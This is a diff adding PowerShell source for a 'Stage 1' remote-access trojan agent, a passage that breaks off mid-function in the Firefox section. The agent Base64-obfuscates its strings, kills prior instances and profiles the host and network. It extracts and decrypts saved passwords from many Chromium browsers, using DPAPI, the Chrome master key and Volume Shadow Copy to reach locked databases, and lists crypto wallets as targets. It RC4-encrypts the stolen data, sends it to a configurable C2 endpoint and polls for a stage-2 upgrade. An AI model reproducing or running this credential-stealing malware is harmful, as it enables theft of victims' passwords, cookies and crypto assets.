@@ -1,0 +1,1704 @@
+# Stage 1 - PowerShell RAT-as-a-Service Reconnaissance Agent
+# Integrated with C2 Server and Telegram Bot Control
+
+param(
+    [string]$C2Server = "http://localhost:8080",
+    [string]$AgentID = [System.Guid]::NewGuid().ToString(),
+    [int]$BeaconInterval = 30,
+    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+)
+
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
+
+# =============================================
+# STRING OBFUSCATION FUNCTIONS
+# =============================================
+
+function Get-ObfuscatedString {
+    param([string]$EncodedString)
+    try {
+        return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedString))
+    } catch {
+        return $EncodedString
+    }
+}
+
+function Build-StringFromParts {
+    param([string[]]$Parts)
+    return ($Parts -join '')
+}
+
+# Obfuscated string constants (Base64 encoded)
+$script:ObfuscatedStrings = @{
+    # Database and file names
+    'LoginData' = 'TG9naW4gRGF0YQ=='  # "Login Data"
+    'WebData' = 'V2ViIERhdGE='  # "Web Data"
+    'Cookies' = 'Q29va2llcw=='  # "Cookies"
+    'NetworkCookies' = 'TmV0d29ya1xDb29raWVz'  # "Network\Cookies"
+    'FormHistory' = 'Zm9ybWhpc3Rvcnkuc3FsaXRl'  # "formhistory.sqlite"
+    'CookiesSqlite' = 'Y29va2llcy5zcWxpdGU='  # "cookies.sqlite"
+    'LocalState' = 'TG9jYWwgU3RhdGU='  # "Local State"
+    
+    # SQL column names
+    'OriginUrl' = 'b3JpZ2luX3VybA=='  # "origin_url"
+    'UsernameValue' = 'dXNlcm5hbWVfdmFsdWU='  # "username_value"
+    'PasswordValue' = 'cGFzc3dvcmRfdmFsdWU='  # "password_value"
+    'EncryptedValue' = 'ZW5jcnlwdGVkX3ZhbHVl'  # "encrypted_value"
+    'HostKey' = 'aG9zdF9rZXk='  # "host_key"
+    'ExpiresUtc' = 'ZXhwaXJlc191dGM='  # "expires_utc"
+    'NameOnCard' = 'bmFtZV9vbl9jYXJk'  # "name_on_card"
+    'CardNumberEncrypted' = 'Y2FyZF9udW1iZXJfZW5jcnlwdGVk'  # "card_number_encrypted"
+    
+    # Browser names
+    'Chrome' = 'Q2hyb21l'  # "Chrome"
+    'Edge' = 'RWRnZQ=='  # "Edge"
+    'Firefox' = 'RmlyZWZveA=='  # "Firefox"
+    'Brave' = 'QnJhdmU='  # "Brave"
+    'Opera' = 'T3BlcmE='  # "Opera"
+    'Vivaldi' = 'Vml2YWxkaQ=='  # "Vivaldi"
+    
+    # Wallet names
+    'MetaMask' = 'TWV0YU1hc2s='  # "MetaMask"
+    'TronLink' = 'VHJvbkxpbms='  # "TronLink"
+    'Exodus' = 'RXhvZHVz'  # "Exodus"
+    'AtomicWallet' = 'QXRvbWljIFdhbGxldA=='  # "Atomic Wallet"
+    'Electrum' = 'RWxlY3RydW0='  # "Electrum"
+    'BitcoinCore' = 'Qml0Y29pbiBDb3Jl'  # "Bitcoin Core"
+    
+    # Process names
+    'PowershellExe' = 'cG93ZXJzaGVsbC5leGU='  # "powershell.exe"
+    'Stage1Recon' = 'c3RhZ2UxLXJlY29uLnBzMQ=='  # "stage1-recon.ps1"
+    
+    # Registry and system paths
+    'UserData' = 'VXNlciBEYXRh'  # "User Data"
+    'Default' = 'RGVmYXVsdA=='  # "Default"
+    'Profile1' = 'UHJvZmlsZSAx'  # "Profile 1"
+    'Extensions' = 'RXh0ZW5zaW9ucw=='  # "Extensions"
+    
+    # Crypto terms
+    'Encrypted' = 'KipFbmNyeXB0ZWQqKg=='  # "**Encrypted**"
+    'NoData' = 'KipObyBEYXRhKio='  # "**No Data**"
+    
+    # API endpoints
+    'PsReport' = 'L3BzL3JlcG9ydA=='  # "/ps/report"
+    'PsUpgrade' = 'L3BzL3VwZ3JhZGU='  # "/ps/upgrade"
+    'Beacon' = 'L2JlYWNvbg=='  # "/beacon"
+    'Result' = 'L3Jlc3VsdA=='  # "/result"
+}
+
+function Get-String {
+    param([string]$Key)
+    if ($script:ObfuscatedStrings.ContainsKey($Key)) {
+        return Get-ObfuscatedString -EncodedString $script:ObfuscatedStrings[$Key]
+    }
+    return $Key
+}
+
+# Dynamic path builders to avoid hardcoded paths
+function Get-BrowserPath {
+    param([string]$Browser, [string]$Profile = 'Default', [string]$File)
+    
+    $basePaths = @{
+        'Chrome' = Build-StringFromParts @($env:LOCALAPPDATA, '\', 'Goo', 'gle\', 'Chr', 'ome\')
+        'Edge' = Build-StringFromParts @($env:LOCALAPPDATA, '\', 'Mic', 'rosoft\', 'Edg', 'e\')
+        'Brave' = Build-StringFromParts @($env:LOCALAPPDATA, '\', 'Bra', 'veSoftware\', 'Bra', 've-Browser\')
+        'Firefox' = Build-StringFromParts @($env:APPDATA, '\', 'Moz', 'illa\', 'Fire', 'fox\')
+        'Opera' = Build-StringFromParts @($env:APPDATA, '\', 'Ope', 'ra Software\', 'Ope', 'ra Stable\')
+        'Vivaldi' = Build-StringFromParts @($env:LOCALAPPDATA, '\', 'Viv', 'aldi\')
+    }
+    
+    if ($basePaths.ContainsKey($Browser)) {
+        $userDataString = Get-String 'UserData'
+        $userDataPath = Build-StringFromParts @($basePaths[$Browser], $userDataString)
+        return Build-StringFromParts @($userDataPath, '\', $Profile, '\', $File)
+    }
+    return $null
+}
+
+# =============================================
+# SINGLE INSTANCE ENFORCEMENT
+# =============================================
+
+function Stop-PreviousInstances {
+    Write-Log "Checking for previous Stage-1 instances..." "WARN"
+    
+    try {
+        $currentPID = $PID
+        $psExeName = Get-String 'PowershellExe'
+        $scriptName = Get-String 'Stage1Recon'
+        $processes = Get-WmiObject Win32_Process | Where-Object { 
+            $_.Name -eq $psExeName -and 
+            $_.ProcessId -ne $currentPID -and 
+            $_.CommandLine -like "*$scriptName*"
+        }
+        
+        foreach ($process in $processes) {
+            Write-Log "Terminating previous Stage-1 instance (PID: $($process.ProcessId))" "WARN"
+            Stop-Process -Id $process.ProcessId -Force -ErrorAction SilentlyContinue
+        }
+        
+        # Also check for any hanging ZIP archives from previous runs
+        $tempFiles = Get-ChildItem "$env:TEMP" -Filter "*_$($AgentID.Substring(0,8))*.zip" -ErrorAction SilentlyContinue
+        foreach ($file in $tempFiles) {
+            Write-Log "Cleaning up previous archive: $($file.Name)"
+            Remove-Item $file.FullName -Force -ErrorAction SilentlyContinue
+        }
+        
+    } catch {
+        Write-Log "Failed to check for previous instances: $_" "ERROR"
+    }
+}
+
+# =============================================
+# CORE C2 COMMUNICATION FUNCTIONS
+# =============================================
+
+function Write-Log {
+    param([string]$Message, [string]$Level = "INFO")
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $(if ($Level -eq "ERROR") { "Red" } elseif ($Level -eq "WARN") { "Yellow" } else { "Green" })
+}
+
+function Encrypt-RC4 {
+    param([string]$Data, [string]$Key)
+    try {
+        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
+        $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
+        
+        # RC4 Key Scheduling Algorithm
+        $S = 0..255
+        $j = 0
+        for ($i = 0; $i -lt 256; $i++) {
+            $j = ($j + $S[$i] + $keyBytes[$i % $keyBytes.Length]) % 256
+            $temp = $S[$i]
+            $S[$i] = $S[$j]
+            $S[$j] = $temp
+        }
+        
+        # RC4 Pseudo-Random Generation Algorithm
+        $i = 0
+        $j = 0
+        $encrypted = @()
+        foreach ($byte in $dataBytes) {
+            $i = ($i + 1) % 256
+            $j = ($j + $S[$i]) % 256
+            $temp = $S[$i]
+            $S[$i] = $S[$j]
+            $S[$j] = $temp
+            $encrypted += $byte -bxor $S[($S[$i] + $S[$j]) % 256]
+        }
+        
+        return [Convert]::ToBase64String($encrypted)
+    } catch {
+        Write-Log "RC4 encryption failed: $_" "ERROR"
+        return $null
+    }
+}
+
+function Send-ReportToC2 {
+    param([hashtable]$ReportData)
+    try {
+        Write-Log "Preparing encrypted report for C2 server..."
+        
+        # Convert report to JSON
+        $jsonReport = $ReportData | ConvertTo-Json -Depth 10 -Compress
+        Write-Log "Report JSON length: $($jsonReport.Length) characters"
+        
+        # Encrypt using RC4 with Agent ID as key (padded to 16 chars if needed)
+        $encryptionKey = if ($AgentID.Length -ge 16) { 
+            $AgentID.Substring(0, 16) 
+        } else { 
+            $AgentID.PadRight(16, '0') 
+        }
+        $encryptedData = Encrypt-RC4 -Data $jsonReport -Key $encryptionKey
+        
+        if (-not $encryptedData) {
+            Write-Log "Failed to encrypt report data" "ERROR"
+            return $false
+        }
+        
+        # Prepare payload
+        $payload = @{
+            data = $encryptedData
+        } | ConvertTo-Json -Compress
+        
+        Write-Log "Sending encrypted report to C2 server..."
+        
+        # Send to C2 server
+        $headers = @{
+            'Content-Type' = 'application/json'
+            'User-Agent' = $UserAgent
+            'X-Agent-ID' = $AgentID
+            'X-Encryption' = 'rc4'
+        }
+        
+        $reportEndpoint = Get-String 'PsReport'
+        $response = Invoke-RestMethod -Uri "$C2Server$reportEndpoint" -Method POST -Body $payload -Headers $headers -TimeoutSec 30
+        
+        Write-Log "Report submitted successfully! Response: $($response.message)"
+        
+        # Check for upgrade approval
+        if ($response.auto_upgrade -eq $true) {
+            Write-Log "Auto-upgrade approved! Value score: $($response.value_score)" "WARN"
+            return $true
+        }
+        
+        Write-Log "Report processed. Value score: $($response.value_score), Auto-upgrade: $($response.auto_upgrade)"
+        return $true
+        
+    } catch {
+        Write-Log "Failed to send report to C2: $_" "ERROR"
+        return $false
+    }
+}
+
+function Check-UpgradeStatus {
+    try {
+        $upgradeEndpoint = Get-String 'PsUpgrade'
+        $response = Invoke-RestMethod -Uri "$C2Server$upgradeEndpoint/$AgentID" -Method GET -Headers @{ 'User-Agent' = $UserAgent } -TimeoutSec 10
+        
+        if ($response.upgrade_approved -eq $true -and $response.current_stage -eq 2) {
+            Write-Log "Upgrade to Stage 2 approved! Downloading..." "WARN"
+            return $true
+        }
+        
+        return $false
+    } catch {
+        Write-Log "Failed to check upgrade status: $_" "ERROR"
+        return $false
+    }
+}
+
+# =============================================
+# SYSTEM RECONNAISSANCE FUNCTIONS
+# =============================================
+
+function Get-SystemProfile {
+    Write-Log "Collecting system profile information..."
+    
+    try {
+        $os = Get-WmiObject Win32_OperatingSystem
+        $cs = Get-WmiObject Win32_ComputerSystem
+        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $principal = New-Object System.Security.Principal.WindowsPrincipal($user)
+        $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+        
+        # Get running processes
+        $processes = Get-Process | Select-Object -ExpandProperty ProcessName | Sort-Object | Get-Unique
+        
+        # Check domain membership
+        $isDomainJoined = $false
+        try {
+            $domain = (Get-WmiObject Win32_ComputerSystem).Domain
+            $isDomainJoined = $domain -notlike "*WORKGROUP*"
+        } catch {}
+        
+        return @{
+            hostname          = $env:COMPUTERNAME
+            username          = $env:USERNAME
+            os                = "$($os.Caption) $($os.Version)"
+            architecture      = $env:PROCESSOR_ARCHITECTURE
+            priv_level        = if ($isAdmin) { "Administrator" } else { "User" }
+            ram_gb            = [int]([math]::Round($cs.TotalPhysicalMemory / 1GB))
+            is_admin          = $isAdmin
+            is_domain_joined  = $isDomainJoined
+            running_processes = $processes
+            ps_version        = $PSVersionTable.PSVersion.ToString()
+        }
+    } catch {
+        Write-Log "Failed to collect system profile: $_" "ERROR"
+        return @{}
+    }
+}
+
+function Get-NetworkInfo {
+    Write-Log "Collecting network information..."
+    
+    try {
+        $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled }
+        $networkType = "unknown"
+        
+        # Determine network type based on IP ranges
+        foreach ($adapter in $adapters) {
+            if ($adapter.IPAddress) {
+                $ip = $adapter.IPAddress[0]
+                if ($ip -like "10.*" -or $ip -like "172.*" -or $ip -like "192.168.*") {
+                    $networkType = "corporate"
+                    break
+                }
+                if ($ip -like "169.254.*") {
+                    $networkType = "isolated"
+                }
+            }
+        }
+        
+        return @{
+            NetworkType = $networkType
+            Adapters = $adapters | ForEach-Object {
+                @{
+                    Description = $_.Description
+                    IPAddress = $_.IPAddress
+                    MACAddress = $_.MACAddress
+                }
+            }
+        }
+    } catch {
+        Write-Log "Failed to collect network info: $_" "ERROR"
+        return @{}
+    }
+}
+
+# =============================================
+# SQLITE DATABASE FUNCTIONS
+# =============================================
+
+function Load-SQLiteAssembly {
+    # Attempt to load a SQLite ADO.NET provider assembly. Try multiple fallbacks.
+    param()
+
+    $loaded = $false
+
+    # 1. Try already installed assembly names
+    foreach ($asmName in @('System.Data.SQLite', 'Microsoft.Data.Sqlite')) {
+        try {
+            [Reflection.Assembly]::Load($asmName) | Out-Null
+            $loaded = $true
+            break
+        } catch {}
+    }
+
+    if (-not $loaded) {
+        # 2. Look for DLLs in common locations (script dir and browser install dirs)
+        $possibleDirs = @(
+            $PSScriptRoot,
+            "$env:LOCALAPPDATA\Google\Chrome\User Data",
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
+            "$env:LOCALAPPDATA\BraveSoftware",
+            "$env:PROGRAMFILES\SQLite",
+            "$env:PROGRAMFILES(x86)\SQLite",
+            "$env:TEMP\sqlite"
+        )
+
+        foreach ($dir in $possibleDirs) {
+            if (-not (Test-Path $dir)) { continue }
+            
+            $dllPath = "$dir\System.Data.SQLite.dll"
+            if (Test-Path $dllPath) {
+                try {
+                    [Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+                    $loaded = $true
+                    break
+                } catch {}
+            }
+        }
+    }
+
+    if (-not $loaded) {
+        # 3. Last resort: try to download a portable SQLite DLL
+        try {
+            $sqliteDir = "$env:TEMP\sqlite"
+            $dllPath = "$sqliteDir\System.Data.SQLite.dll"
+            
+            if (-not (Test-Path $sqliteDir)) {
+                New-Item -ItemType Directory -Path $sqliteDir -Force | Out-Null
+            }
+            
+            if (-not (Test-Path $dllPath)) {
+                # Download from a working SQLite source
+                Write-Log "Attempting to download SQLite assembly..."
+                
+                $downloadUrl = "https://system.data.sqlite.org/downloads/1.0.119.0/sqlite-netFx46-binary-x64-2015-1.0.119.0.zip"
+                $zipPath = "$sqliteDir\sqlite-tools.zip"
+                
+                try {
+                    Write-Log "Downloading SQLite from: $downloadUrl"
+                    $webClient = New-Object System.Net.WebClient
+                    $webClient.DownloadFile($downloadUrl, $zipPath)
+                    
+                    # Extract the archive
+                    Add-Type -AssemblyName System.IO.Compression.FileSystem
+                    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $sqliteDir)
+                    
+                    # Look for the DLL in extracted content
+                    $extractedDll = Get-ChildItem -Path $sqliteDir -Filter "System.Data.SQLite.dll" -Recurse | Select-Object -First 1
+                    if ($extractedDll) {
+                        Copy-Item $extractedDll.FullName $dllPath -Force
+                        $downloaded = $true
+                    } else {
+                        Write-Log "System.Data.SQLite.dll not found in downloaded package" "WARN"
+                    }
+                    
+                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                    
+                } catch {
+                    Write-Log "SQLite download failed: $_" "ERROR"
+                }
+            }
+            
+            if (Test-Path $dllPath) {
+                [Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+                $loaded = $true
+            }
+        } catch {
+            Write-Log "SQLite download failed: $_" "WARN"
+        }
+    }
+
+    if ($loaded) {
+        Write-Log "SQLite assembly loaded successfully"
+        return $true
+    } else {
+        Write-Log "No SQLite assembly available - credential extraction will be limited" "WARN"
+        return $false
+    }
+}
+
+function Copy-LockedDatabase {
+    param([string]$SourcePath, [string]$DestPath)
+    
+    try {
+        # Try direct copy first
+        Copy-Item -Path $SourcePath -Destination $DestPath -Force -ErrorAction Stop
+        return $true
+    } catch {
+        try {
+            # Use Volume Shadow Copy if direct copy fails
+            $vssCommand = "vssadmin create shadow /for=$($SourcePath.Substring(0,2))"
+            $vssOutput = cmd /c $vssCommand 2>&1
+            
+            if ($vssOutput -match "Shadow Copy ID: \{([^\}]+)\}") {
+                $shadowID = $matches[1]
+                $shadowPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*\$($SourcePath.Substring(3))"
+                Copy-Item -Path $shadowPath -Destination $DestPath -Force
+                
+                # Clean up shadow copy
+                cmd /c "vssadmin delete shadows /Shadow={$shadowID} /Quiet" | Out-Null
+                return $true
+            }
+        } catch {}
+        
+        Write-Log "Failed to copy locked database: $SourcePath" "ERROR"
+        return $false
+    }
+}
+
+function Query-SQLite {
+    param([string]$DatabasePath, [string]$Query)
+    
+    # Check if SQLite was loaded at startup
+    if (-not $script:sqliteAvailable) {
+        Write-Log "SQLite not available - skipping database query" "ERROR"
+        return @()
+    }
+    
+    if (-not (Test-Path $DatabasePath)) {
+        Write-Log "Database not found: $DatabasePath" "ERROR"
+        return @()
+    }
+    
+    # First attempt: Try read-only shared-cache connection
+    try {
+        $connectionString = "Data Source=$DatabasePath;Version=3;Read Only=True;Cache=Shared;"
+        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+        $connection.Open()
+        
+        $command = $connection.CreateCommand()
+        $command.CommandText = $Query
+        $reader = $command.ExecuteReader()
+        
+        $results = @()
+        while ($reader.Read()) {
+            $row = @{}
+            for ($i = 0; $i -lt $reader.FieldCount; $i++) {
+                $row[$reader.GetName($i)] = $reader.GetValue($i)
+            }
+            $results += $row
+        }
+        
+        $reader.Close()
+        $connection.Close()
+        
+        Write-Log "SQLite query successful (direct access): $($results.Count) rows"
+        return $results
+        
+    } catch {
+        Write-Log "Direct SQLite access failed: $_ - Attempting VSS copy..." "WARN"
+    }
+    
+    # Second attempt: Copy database to temp location using VSS if needed
+    $tempDb = "$env:TEMP\temp_$(Get-Random).db"
+    
+    try {
+        # Copy database to temp location (with VSS fallback)
+        if (-not (Copy-LockedDatabase -SourcePath $DatabasePath -DestPath $tempDb)) {
+            Write-Log "Failed to copy database for SQLite access: $DatabasePath" "ERROR"
+            return @()
+        }
+        
+        $connectionString = "Data Source=$tempDb;Version=3;"
+        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+        $connection.Open()
+        
+        $command = $connection.CreateCommand()
+        $command.CommandText = $Query
+        $reader = $command.ExecuteReader()
+        
+        $results = @()
+        while ($reader.Read()) {
+            $row = @{}
+            for ($i = 0; $i -lt $reader.FieldCount; $i++) {
+                $row[$reader.GetName($i)] = $reader.GetValue($i)
+            }
+            $results += $row
+        }
+        
+        $reader.Close()
+        $connection.Close()
+        
+        Write-Log "SQLite query successful (VSS copy): $($results.Count) rows"
+        return $results
+        
+    } catch {
+        Write-Log "SQLite query failed completely: $_" "ERROR"
+        return @()
+    } finally {
+        if (Test-Path $tempDb) {
+            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
+# =============================================
+# ENCRYPTION/DECRYPTION FUNCTIONS
+# =============================================
+
+function Decrypt-DPAPIBlob {
+    param([byte[]]$EncryptedData)
+    
+    try {
+        Add-Type -AssemblyName System.Security
+        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        return [System.Text.Encoding]::UTF8.GetString($decrypted)
+    } catch {
+        return $null
+    }
+}
+
+function Get-ChromeMasterKey {
+    param([string]$LocalStatePath)
+    
+    try {
+        if (-not (Test-Path $LocalStatePath)) {
+            return $null
+        }
+        
+        $localState = Get-Content $LocalStatePath | ConvertFrom-Json
+        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+        
+        # Remove "DPAPI" prefix
+        $keyWithoutPrefix = $encryptedKey[5..($encryptedKey.Length-1)]
+        
+        # Decrypt using DPAPI
+        return Decrypt-DPAPIBlob -EncryptedData $keyWithoutPrefix
+        
+    } catch {
+        Write-Log "Failed to get Chrome master key: $_" "ERROR"
+        return $null
+    }
+}
+
+function Decrypt-AESGCMData {
+    param([byte[]]$EncryptedData, [string]$Key)
+    
+    try {
+        # Chrome AES-GCM decryption (simplified)
+        # This is a basic implementation - full AES-GCM requires more complex crypto
+        $nonce = $EncryptedData[3..14]
+        $ciphertext = $EncryptedData[15..($EncryptedData.Length-17)]
+        
+        # For demonstration - in reality you'd need proper AES-GCM
+        Add-Type -AssemblyName System.Security
+        return [System.Security.Cryptography.ProtectedData]::Unprotect($ciphertext, $nonce, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        
+    } catch {
+        return $null
+    }
+}
+
+function Decrypt-ChromePassword {
+    param([byte[]]$EncryptedPassword, [string]$MasterKey)
+    
+    if ($EncryptedPassword.Length -eq 0) {
+        return ""
+    }
+    
+    try {
+        # Check if it's v10/v11 format (starts with "v10" or "v11")
+        $prefix = [System.Text.Encoding]::UTF8.GetString($EncryptedPassword[0..2])
+        
+        if ($prefix -eq "v10" -or $prefix -eq "v11") {
+            if ($MasterKey) {
+                $decrypted = Decrypt-AESGCMData -EncryptedData $EncryptedPassword -Key $MasterKey
+                if ($decrypted) {
+                    return [System.Text.Encoding]::UTF8.GetString($decrypted)
+                }
+            }
+        }
+        
+        # Fallback to DPAPI
+        $decrypted = Decrypt-DPAPIBlob -EncryptedData $EncryptedPassword
+        return if ($decrypted) { $decrypted } else { "" }
+        
+    } catch {
+        return ""
+    }
+}
+
+# =============================================
+# CREDENTIAL EXTRACTION FUNCTIONS
+# =============================================
+
+function Get-BrowserPasswords {
+    Write-Log "Extracting browser passwords..."
+    
+    $passwords = @()
+    
+    # Comprehensive Chromium-based browser paths (matching Go agent exactly)
+    $chromiumBrowsers = @{
+        "Chrome" = @(
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Login Data",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Login Data",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Login Data"
+        )
+        "Edge" = @(
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Login Data",
+            "$env:LOCALAPPDATA\Microsoft\Edge Dev\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Microsoft\Edge Beta\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Microsoft\Edge Canary\User Data\Default\Login Data"
+        )
+        "Brave" = @(
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Login Data",
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser-Beta\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser-Dev\User Data\Default\Login Data"
+        )
+        "Thorium" = @(
+            "$env:LOCALAPPDATA\Thorium\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Thorium\User Data\Profile 1\Login Data",
+            "C:\Program Files\Thorium\User Data\Default\Login Data",
+            "C:\Program Files (x86)\Thorium\User Data\Default\Login Data"
+        )
+        "Opera" = @(
+            "$env:APPDATA\Opera Software\Opera Stable\Login Data",
+            "$env:APPDATA\Opera Software\Opera Beta\Login Data",
+            "$env:APPDATA\Opera Software\Opera Developer\Login Data"
+        )
+        "Opera GX" = @(
+            "$env:APPDATA\Opera Software\Opera GX Stable\Login Data",
+            "$env:APPDATA\Opera Software\Opera GX Beta\Login Data"
+        )
+        "Vivaldi" = @(
+            "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 1\Login Data"
+        )
+        "Yandex" = @(
+            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Profile 1\Login Data"
+        )
+        "UC Browser" = @(
+            "$env:LOCALAPPDATA\UCBrowser\User Data\Default\Login Data"
+        )
+        "Chromium" = @(
+            "$env:LOCALAPPDATA\Chromium\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Chromium\User Data\Profile 1\Login Data"
+        )
+        "Cent Browser" = @(
+            "$env:LOCALAPPDATA\CentBrowser\User Data\Default\Login Data"
+        )
+        "SRWare Iron" = @(
+            "$env:LOCALAPPDATA\Chromium\User Data\Default\Login Data",
+            "C:\Program Files\SRWare Iron\User Data\Default\Login Data",
+            "C:\Program Files (x86)\SRWare Iron\User Data\Default\Login Data"
+        )
+        "Comodo Dragon" = @(
+            "$env:LOCALAPPDATA\Comodo\Dragon\User Data\Default\Login Data"
+        )
+        "Torch Browser" = @(
+            "$env:LOCALAPPDATA\Torch\User Data\Default\Login Data"
+        )
+        "Maxthon" = @(
+            "$env:LOCALAPPDATA\Maxthon3\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Maxthon5\User Data\Default\Login Data"
+        )
+        "Slimjet" = @(
+            "$env:LOCALAPPDATA\Slimjet\User Data\Default\Login Data"
+        )
+        "CocCoc" = @(
+            "$env:LOCALAPPDATA\CocCoc\Browser\User Data\Default\Login Data"
+        )
+        "Avast Secure Browser" = @(
+            "$env:LOCALAPPDATA\AVAST Software\Browser\User Data\Default\Login Data"
+        )
+        "AVG Secure Browser" = @(
+            "$env:LOCALAPPDATA\AVG\Browser\User Data\Default\Login Data"
+        )
+        "360 Chrome" = @(
+            "$env:LOCALAPPDATA\360Chrome\Chrome\User Data\Default\Login Data"
+        )
+        "QQBrowser" = @(
+            "$env:LOCALAPPDATA\Tencent\QQBrowser\User Data\Default\Login Data"
+        )
+        "Sogou Explorer" = @(
+            "$env:LOCALAPPDATA\Sogou\SogouExplorer\User Data\Default\Login Data"
+        )
+    }
+    
+    foreach ($browserName in $chromiumBrowsers.Keys) {
+        $paths = $chromiumBrowsers[$browserName]
+        
+        foreach ($dbPath in $paths) {
+            if (-not (Test-Path $dbPath)) {
+                continue
+            }
+            
+            Write-Log "Found $browserName database: $dbPath"
+            
+            # Get master key for Chrome-based browsers
+            $masterKey = $null
+            $basePath = Split-Path (Split-Path $dbPath)
+            $localStatePath = "$basePath\Local State"
+            if (Test-Path $localStatePath) {
+                $masterKey = Get-ChromeMasterKey -LocalStatePath $localStatePath
+            }
+            
+            $query = "SELECT origin_url, username_value, password_value FROM logins"
+            $results = Query-SQLite -DatabasePath $dbPath -Query $query
+            
+            foreach ($result in $results) {
+                if ($result.password_value -and $result.password_value.GetType().Name -eq "Byte[]") {
+                    $decryptedPassword = Decrypt-ChromePassword -EncryptedPassword $result.password_value -MasterKey $masterKey
+                    
+                    if ($decryptedPassword) {
+                        $passwords += @{
+                            Browser = $browserName
+                            Profile = Split-Path (Split-Path $dbPath) -Leaf
+                            URL = $result.origin_url
+                            Username = $result.username_value
+                            Password = $decryptedPassword
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    # Check for portable browser installations (matching Go agent)
+    $portablePaths = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Downloads",
+        "C:\PortableApps",
+        "D:\PortableApps",
+        "E:\PortableApps"
+    )
+    
+    foreach ($basePath in $portablePaths) {
+        if (-not (Test-Path $basePath)) {
+            continue
+        }
+        
+        $portablePatterns = @(
+            "$basePath\*Chrome*\User Data\Default\Login Data",
+            "$basePath\*Chromium*\User Data\Default\Login Data", 
+            "$basePath\*Thorium*\User Data\Default\Login Data",
+            "$basePath\*Browser*\User Data\Default\Login Data",
+            "$basePath\*Opera*\Login Data",
+            "$basePath\*Brave*\User Data\Default\Login Data"
+        )
+        
+        foreach ($pattern in $portablePatterns) {
+            $matches = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
+            foreach ($match in $matches) {
+                Write-Log "Found portable browser: $($match.FullName)"
+                
+                $query = "SELECT origin_url, username_value, password_value FROM logins"
+                $results = Query-SQLite -DatabasePath $match.FullName -Query $query
+                
+                foreach ($result in $results) {
+                    if ($result.password_value -and $result.password_value.GetType().Name -eq "Byte[]") {
+                        $decryptedPassword = Decrypt-ChromePassword -EncryptedPassword $result.password_value -MasterKey $null
+                        
+                        if ($decryptedPassword) {
+                            $passwords += @{
+                                Browser = "Portable Browser"
+                                Profile = "Default"
+                                URL = $result.origin_url
+                                Username = $result.username_value
+                                Password = $decryptedPassword
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    # Firefox-based browsers (matching Go agent exactly)
+    $firefoxBrowsers = @{
+        "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
+        "Firefox ESR" = "$env:APPDATA\Mozilla\Firefox ESR\Profiles"
+        "Firefox Dev" = "$env:APPDATA\Mozilla\Firefox Developer Edition\Profiles"
+        "Firefox Nightly" = "$env:APPDATA\Mozilla\Firefox Nightly\Profiles"
+        "Floorp" = "$env:APPDATA\Floorp\Profiles"
+        "Waterfox" = "$env:APPDATA\Waterfox\Profiles"
+        "Pale Moon" = "$env:APPDATA\Moonchild Productions\Pale Moon\Profiles"
+        "Basilisk" = "$env:APPDATA\Moonchild Productions\Basilisk\Profiles"
+        "LibreWolf" = "$env:APPDATA\LibreWolf\Profiles"
+        "SeaMonkey" = "$env:APPDATA\Mozilla\SeaMonkey\Profiles"
+        "IceCat" = "$env:APPDATA\Mozilla\IceCat\Profiles"
+        "K-Meleon" = "$env:APPDATA\K-Meleon\Profiles"
+        "Cyberfox" = "$env:APPDATA\8pecxstudios\Cyberfox\Profiles"
+    }
+    
+    foreach ($browserName in $firefoxBrowsers.Keys) {
+        $basePath = $firefoxBrowsers[$browserName]
+        
+        if (-not (Test-Path $basePath)) {
+            continue
+        }
+        
+        $profiles = Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue
